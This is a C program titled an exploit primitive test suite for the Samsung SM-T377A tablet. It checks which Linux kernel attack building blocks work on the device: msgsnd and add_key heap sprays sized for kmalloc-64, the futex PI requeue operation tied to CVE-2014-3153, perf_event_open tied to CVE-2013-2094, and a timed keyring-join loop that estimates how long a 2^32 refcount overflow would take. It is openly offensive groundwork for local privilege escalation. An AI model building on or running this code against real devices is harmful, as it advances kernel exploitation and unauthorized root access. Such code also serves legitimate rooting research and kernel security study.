/*
 * exploit_test.c — Test multiple exploit primitives on Samsung SM-T377A
 *
 * Tests: msgsnd spray, futex PI requeue, perf_event_open, keyring speed
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <linux/keyctl.h>
#include <linux/un.h>

/* ========== Test 1: msgsnd heap spray ========== */
void test_msgsnd(void) {
    printf("\n=== Test 1: msgsnd heap spray ===\n");
    
    struct {
        long mtype;
        char mtext[40]; /* 24 (msg_msg hdr) + 40 = 64 → kmalloc-64 */
    } msg;
    
    msg.mtype = 1;
    memset(msg.mtext, 'A', sizeof(msg.mtext));
    
    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    if (qid < 0) {
        printf("[-] msgget: %s (errno=%d)\n", strerror(errno), errno);
        return;
    }
    printf("[+] msgget OK: qid=%d\n", qid);
    
    int ret = msgsnd(qid, &msg, sizeof(msg.mtext), IPC_NOWAIT);
    if (ret < 0) {
        printf("[-] msgsnd: %s (errno=%d)\n", strerror(errno), errno);
    } else {
        printf("[+] msgsnd OK\n");
        
        /* Verify we can receive */
        struct { long mtype; char mtext[40]; } recv;
        int r = msgrcv(qid, &recv, sizeof(recv.mtext), 0, IPC_NOWAIT);
        if (r > 0) {
            printf("[+] msgrcv OK: got %d bytes, data[0]='%c'\n", r, recv.mtext[0]);
        }
    }
    
    /* Test spray capacity */
    int count = 0;
    for (int i = 0; i < 5000; i++) {
        int q = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
        if (q < 0) break;
        if (msgsnd(q, &msg, sizeof(msg.mtext), IPC_NOWAIT) == 0) {
            count++;
        }
        msgctl(q, IPC_RMID, NULL);
    }
    printf("[*] Spray capacity: %d messages sent successfully\n", count);
    
    msgctl(qid, IPC_RMID, NULL);
}

/* ========== Test 2: futex PI requeue (CVE-2014-3153) ========== */
void test_futex(void) {
    printf("\n=== Test 2: futex PI operations ===\n");
    
    int *futex1 = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                       MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    int *futex2 = (int*)((char*)futex1 + 64);
    
    *futex1 = 0;
    *futex2 = 0;
    
    /* Test basic futex ops */
    struct timespec ts = { .tv_sec = 0, .tv_nsec = 100000 };
    
    int ret;
    
    /* Test FUTEX_LOCK_PI */
    ret = syscall(SYS_futex, futex2, FUTEX_LOCK_PI, 0, &ts, NULL, 0);
    printf("[*] FUTEX_LOCK_PI: ret=%d errno=%d (%s)\n", ret, errno, strerror(errno));
    
    if (ret == 0) {
        /* Unlock it */
        ret = syscall(SYS_futex, futex2, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
        printf("[*] FUTEX_UNLOCK_PI: ret=%d errno=%d\n", ret, errno);
    }
    
    /* Test FUTEX_CMP_REQUEUE_PI — the vulnerable operation */
    *futex1 = 0;
    *futex2 = 0;
    ret = syscall(SYS_futex, futex1, FUTEX_CMP_REQUEUE_PI, 1, 
                  (void*)0, futex2, *futex1);
    printf("[*] FUTEX_CMP_REQUEUE_PI: ret=%d errno=%d (%s)\n", 
           ret, errno, strerror(errno));
    
    /* Test FUTEX_WAIT_REQUEUE_PI */
    *futex1 = 0;
    *futex2 = 0;
    ret = syscall(SYS_futex, futex1, FUTEX_WAIT_REQUEUE_PI, 0,
                  &ts, futex2, 0);
    printf("[*] FUTEX_WAIT_REQUEUE_PI: ret=%d errno=%d (%s)\n",
           ret, errno, strerror(errno));
    
    munmap(futex1, 4096);
}

/* ========== Test 3: perf_event_open ========== */
void test_perf(void) {
    printf("\n=== Test 3: perf_event_open ===\n");
    
    struct perf_event_attr pe;
    memset(&pe, 0, sizeof(pe));
    pe.type = PERF_TYPE_SOFTWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_SW_CPU_CLOCK;
    pe.disabled = 1;
    pe.exclude_kernel = 1;
    pe.exclude_hv = 1;
    
    int fd = syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) {
        printf("[-] perf_event_open: %s (errno=%d)\n", strerror(errno), errno);
    } else {
        printf("[+] perf_event_open OK: fd=%d\n", fd);
        
        /* Test with software event (CVE-2013-2094 vector) */
        struct perf_event_attr pe2;
        memset(&pe2, 0, sizeof(pe2));
        pe2.type = PERF_TYPE_SOFTWARE;
        pe2.size = sizeof(pe2);
        pe2.config = PERF_COUNT_SW_CPU_CLOCK;
        
        int fd2 = syscall(SYS_perf_event_open, &pe2, 0, -1, -1, 0);
        printf("[*] perf SW event: fd=%d errno=%d\n", fd2, errno);
        if (fd2 >= 0) close(fd2);
        
        /* Test with hardware breakpoint (potential vector) */
        struct perf_event_attr pe3;
        memset(&pe3, 0, sizeof(pe3));
        pe3.type = PERF_TYPE_BREAKPOINT;
        pe3.size = sizeof(pe3);
        pe3.bp_type = 1; /* HW_BREAKPOINT_W */
        pe3.bp_addr = 0x12345678;
        pe3.bp_len = 4;
        
        int fd3 = syscall(SYS_perf_event_open, &pe3, 0, -1, -1, 0);
        printf("[*] perf breakpoint: fd=%d errno=%d (%s)\n", fd3, errno, strerror(errno));
        if (fd3 >= 0) close(fd3);
        
        close(fd);
    }
}

/* ========== Test 4: keyring speed ========== */
void test_keyring_speed(void) {
    printf("\n=== Test 4: keyring overflow speed ===\n");
    
    /* Join a named session keyring */
    int ret = syscall(SYS_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "test_kr");
    printf("[*] JOIN_SESSION_KEYRING: ret=%d errno=%d\n", ret, errno);
    
    if (ret < 0) {
        printf("[-] Cannot create session keyring\n");
        return;
    }
    
    /* Speed test: how fast can we call JOIN? */
    struct timeval start, end;
    gettimeofday(&start, NULL);
    
    int count = 0;
    for (int i = 0; i < 1000000; i++) {
        ret = syscall(SYS_keyctl, KEYCTL_JOIN_SESSION_KEYRING, "test_kr");
        if (ret < 0) {
            printf("[-] Failed at iteration %d: errno=%d\n", i, errno);
            break;
        }
        count++;
    }
    
    gettimeofday(&end, NULL);
    double elapsed = (end.tv_sec - start.tv_sec) + 
                     (end.tv_usec - start.tv_usec) / 1e6;
    printf("[*] %d iterations in %.2f seconds (%.0f/sec)\n", 
           count, elapsed, count / elapsed);
    printf("[*] Estimated time for 2^32: %.0f seconds (%.1f minutes)\n",
           4294967296.0 / (count / elapsed),
           4294967296.0 / (count / elapsed) / 60.0);
    
    /* Check refcount via /proc/keys */
    printf("[*] Checking /proc/keys...\n");
    int fd = open("/proc/keys", O_RDONLY);
    if (fd >= 0) {
        char buf[4096];
        int n = read(fd, buf, sizeof(buf) - 1);
        if (n > 0) {
            buf[n] = '\0';
            /* Find our keyring */
            char *p = strstr(buf, "test_kr");
            if (p) {
                /* Back up to start of line */
                while (p > buf && *(p-1) != '\n') p--;
                char *eol = strchr(p, '\n');
                if (eol) *eol = '\0';
                printf("[*] Key entry: %s\n", p);
            }
        }
        close(fd);
    }
}

/* ========== Test 5: add_key spray ========== */
void test_addkey_spray(void) {
    printf("\n=== Test 5: add_key spray ===\n");
    
    char payload[40];
    memset(payload, 'B', sizeof(payload));
    
    int count = 0;
    for (int i = 0; i < 200; i++) {
        char desc[32];
        snprintf(desc, sizeof(desc), "spray_%d", i);
        int key = syscall(SYS_add_key, "user", desc, payload, sizeof(payload),
                          -2 /* KEY_SPEC_SESSION_KEYRING */);
        if (key < 0) {
            if (i == 0) printf("[-] add_key: %s (errno=%d)\n", strerror(errno), errno);
            break;
        }
        count++;
    }
    printf("[*] add_key spray: %d keys created\n", count);
    
    /* Check size class */
    printf("[*] Payload size %zu + key overhead → kmalloc-??\n", sizeof(payload));
}

/* ========== Test 6: sendmsg spray ========== */
void test_sendmsg_spray(void) {
    printf("\n=== Test 6: sendmsg/setsockopt spray ===\n");
    
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("[-] socketpair: %s\n", strerror(errno));
        return;
    }
    printf("[+] socketpair OK: %d, %d\n", sv[0], sv[1]);
    
    /* Test sendmsg with ancillary data (msg_control) */
    char buf[1] = {'X'};
    struct iovec iov = { .iov_base = buf, .iov_len = 1 };
    
    /* Ancillary data for SCM_RIGHTS: pass a fd */
    char cmsgbuf[CMSG_SPACE(sizeof(int))];
    struct msghdr msg = {0};
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsgbuf;
    msg.msg_controllen = sizeof(cmsgbuf);
    
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int*)CMSG_DATA(cmsg) = sv[0]; /* pass fd */
    
    int ret = sendmsg(sv[0], &msg, 0);
    printf("[*] sendmsg (SCM_RIGHTS): ret=%d errno=%d\n", ret, errno);
    
    close(sv[0]);
    close(sv[1]);
}

int main(void) {
    printf("=== Exploit Primitive Test Suite ===\n");
    printf("[*] uid=%d, pid=%d\n", getuid(), getpid());
    
    test_msgsnd();
    test_futex();
    test_perf();
    test_keyring_speed();
    test_addkey_spray();
    test_sendmsg_spray();
    
    printf("\n=== All tests complete ===\n");
    return 0;
}
